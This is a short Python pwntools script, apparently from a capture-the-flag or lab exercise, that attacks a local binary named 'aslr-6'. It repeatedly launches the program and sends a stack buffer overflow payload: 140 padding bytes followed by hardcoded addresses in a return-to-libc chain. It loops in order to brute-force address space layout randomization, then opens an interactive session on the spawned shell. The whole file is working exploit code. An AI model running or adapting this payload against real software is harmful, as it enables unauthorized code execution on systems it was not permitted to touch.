#!/usr/bin/env python

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']


while(True):
    p = process('./aslr-6')
    #gdb.attach(p)
    strn = p32(0xb7e817f2)
    p.sendline("A"*140+p32(0xb7e817e0)+"bbbb"+strn + "\x00\x00\x00\x00\x00\x00\x00\x00")
    p.interactive()
    p.close()
